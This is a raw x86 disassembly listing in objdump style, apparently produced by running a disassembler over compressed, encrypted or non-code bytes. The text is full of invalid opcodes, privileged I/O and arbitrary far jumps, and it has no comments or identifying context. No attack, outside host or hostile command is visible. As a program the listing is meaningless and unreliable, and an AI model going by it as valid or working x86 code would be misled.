  410bc5:	cs sar bh,1
  410bc8:	xor    esp,DWORD PTR [eax+0x1e8c40d3]
  410bce:	mov    ecx,0xd7
	...
  410be3:	add    bl,al
  410be5:	push   ss
  410be6:	outs   dx,DWORD PTR ds:[esi]
  410be7:	(bad)  
  410be8:	cmp    ebp,eax
  410bea:	push   ecx
  410beb:	in     eax,0x4e
  410bed:	inc    esi
  410bee:	outs   dx,BYTE PTR ds:[esi]
  410bef:	mov    BYTE PTR [ecx],cl
  410bf1:	push   edx
  410bf2:	data16 (bad) 
  410bf4:	fwait
  410bf5:	jecxz  0x410c00
  410bf7:	push   0xffcce422
  410bfc:	mov    dh,BYTE PTR [eax]
  410bfe:	inc    edx
  410bff:	test   BYTE PTR [ebx-0x7b8b91a2],0x65
  410c06:	xor    al,BYTE PTR [ecx+0x73]
  410c09:	mov    ?,WORD PTR [esp+eax*4+0x74]
  410c0d:	mov    gs,WORD PTR [esi-0x2]
  410c10:	adc    DWORD PTR [eax],edi
  410c12:	dec    ebp
  410c13:	neg    BYTE PTR [ebx-0x6c]
  410c16:	cs shr ebx,cl
  410c19:	inc    edi
  410c1a:	cwde   
  410c1b:	les    ecx,FWORD PTR [ebx-0x32]
  410c1e:	push   esp
  410c1f:	dec    ebx
  410c20:	cmp    cl,bh
  410c22:	push   es
  410c23:	data16 rcr BYTE PTR [edi+edx*1-0x9303266],0x7b
  410c2c:	adc    BYTE PTR [eax+0x3a2265f6],bh
  410c32:	(bad)  
  410c34:	or     eax,0x1304203d
  410c39:	or     eax,ecx
  410c3b:	ins    DWORD PTR es:[edi],dx
  410c3c:	or     cl,bh
  410c3e:	fsubp  st(7),st
  410c40:	mov    edi,DWORD PTR [edi+ebp*2+0x78cefac2]
  410c47:	jg     0x410c49
	...
  410c59:	add    BYTE PTR [eax],al
  410c5b:	add    bl,dl
  410c5d:	(bad)  
  410c5e:	mov    dh,0x65
  410c60:	push   cs
  410c61:	adc    DWORD PTR [eax-0x20311d93],esi
  410c67:	out    dx,eax
  410c68:	adc    bp,WORD PTR [ebp+0x58]
  410c6c:	fcmove st,st(6)
  410c6e:	xchg   esi,eax
  410c6f:	add    al,0x40
  410c71:	xor    ah,BYTE PTR [edx-0x59]
  410c74:	stos   DWORD PTR es:[edi],eax
  410c75:	mov    BYTE PTR [esi+0x2842bb65],0xdc
  410c7c:	mov    bl,0xce
  410c7e:	xchg   BYTE PTR [esi+0x5bcf48aa],ah
  410c84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410c85:	mov    ah,BYTE PTR [esi+0x65]
  410c88:	call   0x56ce:0x926d5008
  410c8f:	out    dx,eax
  410c90:	fwait
  410c91:	mov    esp,0xce8327ae
  410c96:	inc    esi
  410c97:	scas   eax,DWORD PTR es:[edi]
  410c98:	addr16 (bad) 
  410c9a:	dec    esi
  410c9b:	gs jb  0x410ce6
  410c9e:	iret   
  410c9f:	pop    ebx
  410ca0:	int3   
  410ca1:	nop
  410ca2:	or     BYTE PTR [esi],dh
  410ca4:	jmp    0xe982c877
  410ca9:	into   
  410caa:	cmc    
  410cab:	arpl   WORD PTR es:[esi-0x328c2520],bx
  410cb2:	cmc    
  410cb3:	push   ss
  410cb4:	repz jmp 0xcef21bb7
  410cba:	mov    ebx,0xf5cea10d
  410cbf:	inc    BYTE PTR [eax]
	...
  410cd1:	add    BYTE PTR [eax],al
  410cd3:	add    BYTE PTR [edx],bh
  410cd5:	sahf   
  410cd6:	loopne 0x410cd2
  410cd8:	je     0x410ca7
  410cda:	cmc    
  410cdb:	out    dx,al
  410cdc:	jmp    0x7bce:0xa8e6fded
  410ce3:	stc    
  410ce4:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  410ce6:	xor    al,0xd6
  410ce8:	push   0x70f97bce
  410ced:	or     cl,dl
  410cef:	mov    esi,0x34f5ce68
  410cf4:	call   0x68f887ae
  410cf9:	into   
  410cfa:	cmc    
  410cfb:	je     0x410d44
  410cfd:	(bad)  
  410cfe:	cmc    
  410cff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410d00:	aaa    
  410d01:	mov    bl,0x36
  410d03:	sahf   
  410d04:	xor    dh,cl
  410d06:	mov    ebx,0xf5ce3099
  410d0b:	or     DWORD PTR [eax-0x71],0x82886f5
  410d12:	in     eax,0x76
  410d14:	xor    dh,cl
  410d16:	loopne 0x410cbd
  410d18:	imul   ecx,ebp,0xb5ea6ef5
  410d1e:	std    
  410d1f:	data16 sub BYTE PTR [ebp-0x310ee039],dh
  410d26:	cmc    
  410d27:	pushf  
  410d28:	jecxz  0x410cf0
  410d2a:	cmc    
  410d2b:	dec    esi
  410d2c:	xlat   BYTE PTR ds:[ebx]
  410d2d:	pop    es
  410d2e:	aaa    
  410d2f:	add    dl,cl
  410d31:	cmp    dh,dh
  410d33:	mov    ch,0xd5
  410d35:	inc    eax
  410d36:	idiv   bh
	...
  410d4c:	int    0x2c
  410d4e:	xor    al,0xff
  410d50:	stos   BYTE PTR es:[edi],al
  410d51:	cmp    BYTE PTR [eax+edi*8+0x7c],cl
  410d55:	or     ah,dh
  410d57:	jmp    FWORD PTR [edx-0x720383c8]
  410d5d:	nop
  410d5e:	pop    ds
  410d5f:	add    BYTE PTR ds:0x250cc78a,ah
  410d65:	fiadd  WORD PTR [edx-0xe724914]
  410d6b:	push   0x35
  410d6d:	jmp    0x410db1
  410d6f:	jmp    DWORD PTR [eax+0x6ebdedc9]
  410d75:	xor    esi,esi
  410d77:	mov    DWORD PTR [eax-0x128a09cc],esi
  410d7d:	mov    eax,0x98a4693d
  410d82:	cmc    
  410d83:	xor    eax,0x48e016
  410d88:	mov    ebp,0x1afff46b
  410d8d:	xor    DWORD PTR [eax+ecx*1+0x4d],edi
  410d91:	mov    al,0x5f
  410d93:	inc    ecx
  410d94:	in     eax,0xb8
  410d96:	pop    es
  410d97:	add    BYTE PTR [ebp+0x18e2ee10],dh
  410d9d:	xor    esi,esi
  410d9f:	jmp    DWORD PTR [eax-0x428a09cc]
  410da5:	cmp    ch,al
  410da7:	cmp    ebp,DWORD PTR [edx]
  410da9:	xor    eax,eax
  410dab:	ret    0x90b1
  410dae:	pop    ebx
  410daf:	mov    eax,DWORD PTR [eax]
	...
  410dc1:	add    BYTE PTR [eax],al
  410dc3:	add    BYTE PTR [ecx],bl
  410dc5:	adc    eax,0x90bffcca
  410dca:	bound  ecx,QWORD PTR [edx+ebp*8-0x13]
  410dce:	or     eax,0x16e98ce8
  410dd3:	(bad)  
  410dd4:	jnp    0x410e0b
  410dd6:	mov    edi,0x9bde4fb
  410ddb:	out    dx,eax
  410ddc:	sub    ah,dh
  410dde:	call   0xe599:0xe1bdcd68
  410de5:	cld    
  410de6:	or     edi,edi
  410de8:	fld    st(5)
  410dea:	popa   
  410deb:	pop    esi
  410dec:	mov    bl,0xaa
  410dee:	imul   edi,esi,0x7469a1b9
  410df4:	test   BYTE PTR [ebp-0x6cccc591],dl
  410dfa:	inc    ebx
  410dfb:	rcl    DWORD PTR [eax+0x308ab0bd],0x3d
  410e02:	inc    eax
  410e03:	iret   
  410e04:	and    edi,DWORD PTR [ebx-0x4e367396]
  410e0a:	mov    ecx,0x6ab981fe
  410e0f:	je     0x410da5
  410e11:	aad    0x38
  410e13:	sub    cl,BYTE PTR [ebp+edi*4+0x3883c006]
  410e1a:	lock add DWORD PTR [ebp+edi*4-0x421bbbbe],ecx
  410e22:	or     DWORD PTR [eax],eax
  410e24:	mov    edx,?
  410e26:	shl    bl,0x0
	...
  410e39:	add    BYTE PTR [eax],al
  410e3b:	add    bl,dl
  410e3d:	mov    edx,0xbd360009
  410e42:	jecxz  0x410e43
  410e44:	xor    eax,0x8ffe3bd
  410e49:	jno    0x410e9b
  410e4b:	dec    edi
  410e4c:	add    DWORD PTR [ecx],edi
  410e4e:	pop    ebp
  410e4f:	imul   BYTE PTR [ebx+0x19feb94a]
  410e55:	inc    ebp
  410e56:	push   0x74
  410e58:	cwde   
  410e59:	adc    eax,0x948c286b
  410e5e:	fisttp WORD PTR [esi]
  410e60:	dec    esp
  410e61:	inc    eax
  410e62:	in     al,dx
  410e63:	ins    BYTE PTR es:[edi],dx
  410e64:	pop    ebx
  410e65:	xchg   ebp,eax
  410e66:	fild   WORD PTR [ebx]
  410e68:	in     al,0xfb
  410e6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410e6b:	les    esi,FWORD PTR [ebx-0x36]
  410e6e:	mov    ah,0xf
  410e70:	je     0x410ed6
  410e72:	mov    al,ds:0x6a646262
  410e77:	xor    ecx,DWORD PTR [eax]
  410e79:	adc    DWORD PTR [edx+ebx*2],edi
  410e7c:	push   edx
  410e7d:	retf   
  410e7e:	scas   eax,DWORD PTR es:[edi]
  410e7f:	mov    ch,0x33
  410e81:	push   esp
  410e82:	mov    al,ds:0x651d4262
  410e87:	cmp    eax,DWORD PTR [edx-0x35]
  410e8a:	push   es
  410e8b:	imul   ebx,DWORD PTR [ecx],0xffffff89
  410e8e:	push   cs
  410e8f:	bound  esi,QWORD PTR [ebp-0x4bbb686c]
  410e95:	push   ebp
  410e96:	fbld   TBYTE PTR [edx-0x20]
  410e99:	jmp    0x410e99
  410e9b:	popa   
  410e9c:	adc    cl,bl
  410e9e:	push   esp
  410e9f:	or     al,0x0
	...
  410eb1:	add    BYTE PTR [eax],al
  410eb3:	add    ah,dh
  410eb5:	sub    al,0x20
  410eb7:	popa   
  410eb8:	add    bl,BYTE PTR ds:0xcb025465
  410ebe:	(bad)  
  410ebf:	out    dx,al
  410ec0:	repz xor ah,BYTE PTR [edi-0x496bb315]
  410ec7:	xchg   edi,eax
  410ec8:	mov    ebx,0xda61bec2
  410ecd:	inc    eax
  410ece:	out    0x6b,eax
  410ed0:	push   ecx
  410ed1:	push   esp
  410ed2:	scas   al,BYTE PTR es:[edi]
  410ed3:	popa   
  410ed4:	adc    al,0x11
  410ed6:	test   BYTE PTR [ecx-0x3e],bl
  410ed9:	retf   0x409
  410edc:	and    al,0xb9
  410ede:	or     bl,al
  410ee0:	mov    bl,0xc9
  410ee2:	xor    al,0x3c
  410ee4:	mov    ds:0x186176ca,al
  410ee9:	pushf  
  410eea:	or     BYTE PTR [ecx+0x6ef58ab1],al
  410ef0:	pop    es
  410ef1:	adc    cl,ah
  410ef3:	pop    esi
  410ef4:	in     eax,dx
  410ef5:	retf   0x6483
  410ef8:	int3   
  410ef9:	ret    0x56f5
  410efc:	inc    eax
  410efd:	xor    cl,BYTE PTR [esi]
  410eff:	ret    
  410f00:	dec    esi
  410f01:	retf   0x7cf6
  410f04:	test   al,0xc2
  410f06:	cmc    
  410f07:	ds in  eax,dx
  410f09:	inc    eax
  410f0a:	add    BYTE PTR [ecx+0x51],al
  410f0d:	mov    dh,ch
  410f0f:	cs pop es
  410f11:	adc    ebp,ebp
  410f13:	push   ds
  410f14:	lods   eax,DWORD PTR ds:[esi]
  410f15:	retf   0xe962
	...
  410f2c:	aaa    
  410f2d:	scas   eax,DWORD PTR es:[edi]
  410f2e:	bound  ebp,QWORD PTR [eax+0x31bbc98f]
  410f34:	aad    0xca
  410f36:	cmc    
  410f37:	push   es
  410f38:	inc    ebx
  410f39:	xchg   edx,eax
  410f3a:	loopne 0x410f0d
  410f3c:	dec    edi
  410f3d:	retf   
  410f3e:	cmc    
  410f3f:	pusha  
  410f40:	adc    ebp,edx
  410f42:	std    
  410f43:	out    dx,al
  410f44:	lods   al,BYTE PTR ds:[esi]
  410f45:	sbb    BYTE PTR [ecx+edi*4+0x39f5ca64],cl
  410f4c:	lock xchg BYTE PTR [edx+0x28],ah
  410f50:	nop
  410f51:	leave  
  410f52:	mov    ebx,0xf5ca54b1
  410f57:	mov    dl,0x91
  410f5a:	loopne 0x410f4d
  410f5c:	iret   
  410f5d:	retf   0x60f5
  410f60:	adc    ah,dh
  410f62:	std    
  410f63:	scas   al,BYTE PTR es:[edi]
  410f64:	ins    BYTE PTR es:[edi],dx
  410f65:	push   ss
  410f66:	mov    ah,0x99
  410f68:	fs retf 0xe9f5
  410f6c:	fstp   TBYTE PTR [esi]
  410f6e:	mov    DWORD PTR [ebx+ebp*1-0x3e],edx
  410f72:	cmc    
  410f73:	mov    cs,WORD PTR [edi+0x36006a40]
  410f79:	sub    ch,dh
  410f7b:	mul    DWORD PTR [edx]
  410f7d:	xor    al,0xf5
  410f7f:	jae    0x410ffd
  410f81:	mov    eax,0xf312fff5
  410f86:	div    BYTE PTR [ebp-0x7b]
  410f89:	cmp    eax,0x34e2397a
  410f8e:	div    BYTE PTR [ebp+0x0]
	...
  410fa4:	aad    0x6c
  410fa6:	idiv   bh
  410fa8:	ret    0x5e2
  410fab:	call   0x36be6a
  410fb0:	mov    ds:0xa2f7e222,al
  410fb5:	xor    al,0xf6
  410fb7:	jne    0x410fee
  410fb9:	cmp    eax,0x347239b0
  410fbe:	div    BYTE PTR [ebp-0x99363]
  410fc4:	mov    ds:0xcee805e2,al
  410fc9:	scas   al,BYTE PTR es:[edi]
  410fca:	cmc    
  410fcb:	call   DWORD PTR [edx+0x22f7d222]
  410fd1:	imul   esi,esi,0xf66c89b5
  410fd7:	jmp    DWORD PTR [edx]
  410fd9:	fild   WORD PTR ds:0xf5a75ee8
  410fdf:	jmp    edx
  410fe1:	sub    dl,dh
  410fe3:	mul    edx
  410fe5:	push   0x3cf575f6
  410fea:	cmp    BYTE PTR [ecx],0xd2
  410fed:	push   0x6105bd8a
  410ff2:	idiv   bh
  410ff4:	in     eax,0xe0
  410ff6:	sub    BYTE PTR [eax-0x1c],ch
  410ff9:	xchg   esp,eax
  410ffa:	in     eax,0xbe
  410ffc:	repnz jmp 0xfff5:0xa7c4e805
  411004:	mov    WORD PTR [edx],fs
  411006:	nop
  411007:	iret   
	...
  41101c:	mov    ebx,0xe1fe5619
  411021:	es pop esi
  411023:	(bad)  
  411024:	mov    ds:0xa40fcf49,eax
  411029:	or     eax,0x3993ff15
  41102e:	iret   
  41102f:	jnp    0x8437455e
  411035:	addr16 push ebp
  411037:	je     0x410fbd
  411039:	push   ebp
  41103a:	and    al,0xfe
  41103c:	jae    0x411095
  41103e:	push   ebp
  41103f:	mov    ah,0x44
  411041:	xchg   DWORD PTR [ebp-0x2],edx
  411044:	je     0x411014
  411046:	adc    eax,0x8f7f5bff
  41104b:	out    dx,eax
  41104c:	pop    ebx
  41104d:	ja     0x4110a4
  41104f:	out    0x71,eax
  411051:	mov    cl,0x56
  411053:	inc    BYTE PTR [ebx+0x61]
  411056:	js     0x41104e
  411058:	cmp    ebx,DWORD PTR [edi-0x698fe69c]
  41105e:	push   ebp
  41105f:	(bad)  
  411060:	loope  0x411007
  411062:	pop    ebp
  411063:	(bad)  
  411064:	and    esp,DWORD PTR [esi-0x40e4c3fb]
  41106a:	push   esi
  41106b:	mov    ah,0x28
  41106d:	mov    edi,0xb9f4fe56
  411072:	adc    eax,0x90e703ff
  411077:	fild   WORD PTR [ebx]
  411079:	fist   WORD PTR [esi-0x19]
  41107c:	cmc    
  41107d:	mov    ds:0xfe55,al
	...
  411092:	add    BYTE PTR [eax],al
  411094:	jmp    0x4110de
  411096:	cmp    eax,0x6206e3f6
  41109b:	in     eax,dx
  41109c:	xchg   edi,eax
  41109d:	(bad)  
  41109e:	push   esi
  41109f:	dec    BYTE PTR [ecx+0x5]
  4110a2:	gs stc 
  4110a4:	leave  
  4110a5:	xchg   esp,eax
  4110a6:	scas   al,BYTE PTR es:[edi]
  4110a7:	pop    esi
  4110a8:	ret    0x9341
  4110ab:	imul   eax,DWORD PTR [ebp-0x3afc2084],0xffffffd2
  4110b2:	rol    DWORD PTR [ebx],cl
  4110b4:	inc    ecx
  4110b5:	sbb    ebx,DWORD PTR [edx+eax*4+0x419c8cf]
  4110bc:	es pop ecx
  4110be:	jle    0x411098
  4110c0:	mov    edi,DWORD PTR [edi+ebx*8+0x78c78b1c]
  4110c7:	enter  0xc787,0xdc
  4110cb:	or     esp,esp
  4110cd:	icebp  
  4110ce:	enter  0x73c4,0xc6
  4110d2:	sbb    al,0x33
  4110d4:	rcl    DWORD PTR [ebp-0x21],cl
  4110d7:	imul   eax,DWORD PTR [edx],0xffffffc9
  4110da:	ss pop esi
  4110dc:	pop    edx
  4110dd:	inc    ecx
  4110de:	out    0xeb,eax
  4110e0:	sub    BYTE PTR ds:0x92b403a0,bh
  4110e6:	fild   WORD PTR [ebx]
  4110e8:	or     al,0xbc
  4110ea:	fs pusha 
  4110ec:	cmp    al,bh
  4110ee:	push   ds
  4110ef:	fdiv   DWORD PTR [edi]
  4110f1:	(bad)  
  4110f2:	pushf  
  4110f3:	or     esi,DWORD PTR [ebx+eiz*4]
  4110f6:	enter  0x5e,0x0
	...
  41110a:	add    BYTE PTR [eax],al
  41110c:	and    bl,ch
  41110e:	and    DWORD PTR [edi],eax
  411110:	mov    WORD PTR [ecx+0x6a],fs
  411113:	outs   dx,DWORD PTR ds:[esi]
  411114:	push   cs
  411115:	shl    bl,1
  411117:	mov    ah,0x62
  411119:	cmp    bl,bh
  41111b:	jmp    0xc9dd871
  411120:	in     al,0x0
  411122:	sbb    BYTE PTR [ebp-0xe],bl
  411125:	sbb    al,0x2d
  411127:	pusha  
  411128:	push   ss
  411129:	adc    DWORD PTR [esi],0x7a944ccc
  41112f:	pop    ds
  411130:	aaa    
  411131:	pop    esp
  411132:	or     BYTE PTR [eax],ch
  411134:	mov    BYTE PTR [esi+esi*1],dl
  411137:	jmp    0x29a1611f
  41113c:	mov    dh,0x53
  41113e:	or     BYTE PTR [esi],dh
  411140:	sub    ch,ah
  411142:	sub    eax,0xc89b8fe9
  411147:	adc    eax,0xcfe060a9
  41114c:	retf   0xf5c5
  41114f:	sbb    DWORD PTR [eax-0xd790a3a],ebp
  411155:	cs aas 
  411157:	add    ecx,DWORD PTR [edi-0x3a]
  41115a:	inc    ebp
  41115b:	pop    bx
  41115d:	mov    fs,eax
  41115f:	sbb    esp,DWORD PTR [edi+eax*8-0xb]
  411163:	inc    ecx
  411164:	xchg   ebp,eax
  411165:	mov    ebp,esi
  411167:	dec    esi
  411168:	cmc    
  411169:	xchg   esp,eax
  41116a:	dec    esi
  41116b:	imul   eax,DWORD PTR [edx+0x437b94],0x0
	...
  411181:	add    BYTE PTR [eax],al
  411183:	add    BYTE PTR [edx-0x36],dl
  411186:	cmp    DWORD PTR [ecx],ebp
  411188:	test   esi,0xc3e92ef5
  41118e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41118f:	loope  0x411119
  411191:	aas    
  411192:	mov    cl,0x1e
  411194:	arpl   dx,cx
  411196:	cmc    
  411197:	pushf  
  411198:	xchg   DWORD PTR [ebp+ebx*4+0x55c6c8d1],edi
  41119f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4111a0:	(bad)  
  4111a1:	ror    DWORD PTR [ecx+ebp*8],cl
  4111a4:	loop   0x4111c0
  4111a6:	in     eax,0x6a
  4111a8:	(bad)  
  4111a9:	leave  
  4111aa:	(bad)  
  4111ab:	jmp    0x5d3668a5
  4111b0:	nop
  4111b1:	mov    esp,0xc659212f
  4111b6:	jg     0x4111e4
  4111b8:	ins    BYTE PTR es:[edi],dx
  4111b9:	cmp    ecx,DWORD PTR [eax]
  4111bb:	inc    ecx
  4111bc:	ret    0x473b
  4111bf:	add    ch,dh
  4111c1:	mov    ecx,0x90a46a5b
  4111c6:	cmc    
  4111c7:	xor    eax,0x48d9f6
  4111cc:	int    0x68
  4111ce:	xor    al,0xff
  4111d0:	jmp    0x6e00:0x8c74c89c
  4111d7:	add    BYTE PTR [ebp+0x3268b338],ah
  4111dd:	mov    ebx,0x67850048
  4111e2:	jl     0x4111ec
  4111e4:	std    
  4111e5:	push   edx
  4111e6:	push   0xffffffff
	...
  4111fc:	sbb    bh,BYTE PTR [ecx]
  4111fe:	mov    edi,0x6d68fa3a
  411203:	add    BYTE PTR [ebp+0x38],dh
  411206:	mov    bl,0x68
  411208:	repnz mov ebx,0xe74d0048
  41120e:	pop    edi
  41120f:	inc    ecx
  411210:	jne    0x41127a
  411212:	jl     0x41121c
  411214:	mov    ebp,0x9aff6a61
  411219:	push   0xde9afc7c
  41121e:	or     eax,0xf5a893e8
  411223:	(bad)  
  411224:	jl     0x411279
  411226:	or     DWORD PTR [eax],eax
  411228:	add    BYTE PTR [edx+eiz*8],bl
  41122b:	and    DWORD PTR [ecx+0x65],0x5b
  41122f:	push   edi
  411230:	setno  BYTE PTR [edx+0x50]
  411234:	mov    bl,dh
  411236:	or     eax,0xf5a05de8
  41123b:	jmp    FWORD PTR [esi+ecx*8+0x408bf1]
  411242:	dec    esi
  411243:	inc    ecx
  411244:	cmc    
  411245:	adc    eax,0xcfbd5b35
  41124a:	cmc    
  41124b:	jg     0x4111d9
  41124d:	sahf   
  41124e:	or     al,0x74
  411250:	push   ecx
  411251:	push   ebx
  411252:	jp     0x4112bd
  411254:	dec    ebp
  411255:	mov    ebx,0x8cf1e7ba
  41125a:	or     al,0x0
  41125c:	xchg   ebx,edi
  41125e:	fcomp  DWORD PTR [esi]
	...
  411274:	(bad)  
  411276:	adc    eax,DWORD PTR [ebx+eax*8-0x13]
  41127a:	mov    esp,0x62bb8c67
  41127f:	mov    ebp,0x40e65b24
  411284:	mov    WORD PTR [ebx+0x23947451],cs
  41128a:	enter  0x9b62,0x45
  41128e:	fs dec ebp
  411290:	push   esi
  411291:	ds push ecx
  411293:	jmp    0xe08c:0x3d8c7b8d
  41129a:	push   ebx
  41129b:	inc    ebp
  41129c:	js     0x41123d
  41129e:	dec    esp
  41129f:	mov    eax,0xfe516b73
  4112a4:	pop    esi
  4112a5:	inc    esp
  4112a6:	adc    al,0x7
  4112a8:	fst    DWORD PTR [esi]
  4112aa:	push   edx
  4112ab:	je     0x411305
  4112ad:	adc    edi,0x7
  4112b0:	sbb    BYTE PTR fs:[edx],bl
  4112b3:	dec    DWORD PTR [ebx+0x13]
  4112b6:	mov    al,0xc8
  4112b8:	dec    esi
  4112b9:	mov    dl,0x9
  4112bb:	push   ebp
  4112bc:	pop    es
  4112bd:	xchg   edx,eax
  4112be:	(bad)  
  4112bf:	ret    
  4112c0:	xor    BYTE PTR [ebx+edi*4],al
  4112c3:	imul   ecx,DWORD PTR [edi+edx*1-0x3a660143],0xc2634961
  4112ce:	push   edx
  4112cf:	mov    cl,cl
  4112d1:	leave  
  4112d2:	xchg   BYTE PTR [ebx+eiz*2],dh
  4112d5:	cmc    
  4112d6:	int3   
  4112d7:	inc    DWORD PTR [eax]
	...
  4112e9:	add    BYTE PTR [eax],al
  4112eb:	add    BYTE PTR [esi],dl
  4112ed:	xchg   ebp,eax
  4112ee:	sub    al,0xbf
  4112f0:	push   ebx
  4112f1:	push   ebp
  4112f2:	fild   WORD PTR [ebx-0x3eac6b4e]
  4112f8:	jae    0x4112ea
  4112fa:	dec    ecx
  4112fb:	(bad)
  4112fe:	xlat   BYTE PTR ds:[ebx]
  4112ff:	loop   0x4112b2
  411301:	xchg   esp,eax
  411302:	fisttp WORD PTR [esi]
  411304:	int3   
  411305:	dec    eax
  411306:	fidiv  WORD PTR [ecx+0x5b22ffb3]
  41130c:	ret    0x1764
  41130f:	add    al,0x8c
  411311:	mov    bl,0x55
  411313:	jmp    0x411306
  411315:	and    BYTE PTR cs:[esp+edi*1],al
  411319:	ret    
  41131a:	sbb    al,0xc
  41131c:	mov    ah,0xdb
  41131e:	add    DWORD PTR [ebx-0x66],ebx
  411321:	lods   al,BYTE PTR ds:[esi]
  411322:	(bad)  
  411323:	sbb    al,0x93
  411325:	ret    
  411326:	mov    al,BYTE PTR [edx+edx*8]
  411329:	adc    al,0xa6
  41132b:	add    edi,ecx
  41132d:	mov    esi,0xd4be57a5
  411332:	test   al,0x5a
  411334:	jb     0x4112f9
  411336:	pop    esi
  411337:	push   ebp
  411338:	cmp    DWORD PTR [esi+ebp*8-0x30],edi
  41133c:	es ret 
  41133e:	mov    ah,0x57
  411340:	pop    edx
  411341:	dec    ecx
  411342:	imul   DWORD PTR [ebx-0x59]
  411345:	mov    edi,DWORD PTR [esi]
  411347:	pop    edx
  411348:	jmp    0xb494:0x8f452862
  41134f:	mov    es,WORD PTR [eax]
	...
  411361:	add    BYTE PTR [eax],al
  411363:	add    BYTE PTR [edi],ah
  411365:	pop    ss
  411366:	sub    al,0x57
  411368:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411369:	xchg   esp,eax
  41136a:	mov    DWORD PTR [ebp+0x6be7492a],esi
  411370:	push   ecx
  411371:	mov    cl,BYTE PTR [esi]
  411373:	pop    edx
  411374:	add    al,0x59
  411376:	repz jmp 0xc38f:0xa8082e44
  41137e:	jnp    0x411361
  411380:	ja     0x4113d3
  411382:	call   0x7c03696d
  411387:	fst    QWORD PTR [ebp+0x48]
  41138a:	add    cl,al
  41138c:	inc    edi
  41138d:	mov    ebp,esi
  41138f:	into   
  411390:	push   edi
  411391:	aad    0xc
  411393:	jmp    0x6b2621c2
  411398:	dec    esp
  411399:	jecxz  0x4113f9
  41139b:	mov    dh,0xdb
  41139d:	mov    fs,eax
  41139f:	and    al,0xa6
  4113a1:	ret    
  4113a2:	cmc    
  4113a3:	repnz dec edi
  4113a5:	dec    eax
  4113a6:	or     edi,DWORD PTR [edi]
  4113a8:	inc    edi
  4113a9:	aad    0x0
  4113ab:	jmp    0x3a396bc2
  4113b0:	inc    ebp
  4113b1:	dec    eax
  4113b2:	add    al,0x91
  4113b4:	cmp    eax,0x817ef581
  4113b9:	aam    0x5
  4113bb:	ins    DWORD PTR es:[edi],dx
  4113bc:	cwde   
  4113bd:	xchg   ebx,eax
  4113be:	or     cl,ch
  4113c0:	in     al,0x48
  4113c2:	hlt    
  4113c3:	push   ecx
  4113c4:	cmp    bh,BYTE PTR [ebp-0xb]
  4113c7:	pop    esi
	...
  4113dc:	pop    es
  4113dd:	pop    ecx
  4113de:	in     al,0x56
  4113e0:	pop    ebx
  4113e1:	mov    esi,0xc2ebd4f5
  4113e6:	jnp    0x411429
  4113e8:	call   0xb57f432e
  4113ed:	push   cs
  4113ee:	jl     0x411435
  4113f0:	mov    bh,0xf1
  4113f2:	or     cl,ch
  4113f4:	(bad)  
  4113f5:	sub    al,0x50
  4113f7:	xchg   edx,eax
  4113f8:	dec    esi
  4113f9:	ret    0x115b
  4113fc:	adc    edi,DWORD PTR [ecx+0x8]
  4113ff:	jmp    0xe4bce89c
  411404:	mov    dh,0xf8
  411406:	or     BYTE PTR [eax],al
  411408:	and    eax,0xfdf08196
  41140d:	std    
  41140e:	bound  eax,QWORD PTR [ecx-0xb]
  411411:	sub    eax,0x95f523d5
  411416:	or     eax,esi
  411418:	jl     0x4113ec
  41141a:	in     eax,dx
  41141b:	push   0x48af45
  411420:	stos   DWORD PTR es:[edi],eax
  411421:	xor    BYTE PTR [ebp+0x25],dh
  411424:	cmc    
  411425:	xchg   ebp,eax
  411426:	add    eax,eax
  411428:	cwde   
  411429:	shl    eax,0x80
  41142c:	in     eax,0x95
  41142e:	or     BYTE PTR [edx-0xaac1b],cl
  411434:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411435:	or     dh,bh
  411437:	jne    0x411456
  411439:	cs mov ebp,0x195a523
  41143f:	rol    BYTE PTR [eax],0x0
	...
  411452:	add    BYTE PTR [eax],al
  411454:	mov    DWORD PTR [eax+0x5d094580],edi
  41145a:	jl     0x411444
  41145c:	std    
  41145d:	inc    esp
  41145e:	dec    ebp
  41145f:	call   DWORD PTR [edx]
  411461:	push   cs
  411462:	dec    ebp
  411463:	loopne 0x411467
  411465:	shr    ecx,cl
  411467:	(bad)  
  411468:	js     0x41149f
  41146a:	in     eax,dx
  41146b:	jns    0x4114a9
  41146d:	pop    esp
  41146e:	test   BYTE PTR [ebx],0xa5
  411471:	shl    DWORD PTR [edx],1
  411473:	rcl    DWORD PTR [eax+0x61],1
  411476:	pop    edi
  411477:	add    al,al
  411479:	add    ch,dl
  41147b:	push   eax
  41147c:	rcl    dl,cl
  41147e:	aad    0xe8
  411480:	cmp    BYTE PTR [edx+0x552efff6],0x79
  411487:	es dec ebp
  411489:	xchg   esi,eax
  41148a:	or     bh,ch
  41148c:	mov    bl,0x5c
  41148e:	jl     0x411498
  411490:	popf   
  411491:	add    eax,0xaa8cff3d
  411496:	push   eax
  411497:	je     0x4114cd
  411499:	xchg   edx,eax
  41149a:	mov    BYTE PTR [edi],0x24
  41149d:	push   edx
  41149e:	push   es
  41149f:	call   DWORD PTR [ebx]
  4114a1:	ret    0xe3c3
  4114a4:	or     eax,DWORD PTR [eax+0x69]
  4114a7:	(bad)  
  4114a8:	jns    0x41145d
  4114aa:	popa   
  4114ab:	ins    BYTE PTR es:[edi],dx
  4114ac:	sar    DWORD PTR [edx-0x348601a3],0x64
  4114b3:	jge    0x411459
  4114b5:	jmp    0x0:0x595d
	...
  4114cc:	inc    esp
  4114cd:	xor    edi,esp
  4114cf:	jg     0x41146b
  4114d1:	stos   DWORD PTR es:[edi],eax
  4114d2:	push   cs
  4114d3:	test   DWORD PTR [ebx+0x2],ecx
  4114d6:	pop    esi
  4114d7:	(bad)  
  4114d8:	xor    al,0xad
  4114da:	or     edi,ebp
  4114dc:	add    dh,dl
  4114de:	xlat   BYTE PTR ds:[ebx]
  4114df:	pop    es
  4114e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4114e1:	mov    edi,0x21b3ff18
  4114e6:	fdivr  st,st(3)
  4114e8:	stos   DWORD PTR es:[edi],eax
  4114e9:	lahf   
  4114ea:	pusha  
  4114eb:	(bad)  
  4114ec:	sbb    DWORD PTR [ebx+0x1a613c61],esi
  4114f2:	pop    esi
  4114f3:	(bad)  
